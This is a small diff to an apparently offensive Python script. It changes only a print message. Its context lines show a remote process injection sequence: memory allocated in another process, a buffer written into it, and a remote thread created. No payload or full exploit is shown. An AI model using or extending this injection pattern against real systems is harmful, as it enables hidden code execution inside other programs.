@@ -46,7 +46,7 @@ if __name__ == "__main__":
         bbuf_len = len(bbuf)
         try:
             base_addr = ps_handle.virtual_alloc_ex(bbuf_len)
-            print(f"Base Address @ {base_addr}")
+            print(f"--> Base Address @ {base_addr}")
             print("[+] Writing data into allocated memory...")
             ps_handle.write_process_memory(bbuf, bbuf_len)
             print("[+] Creating remote thread...")
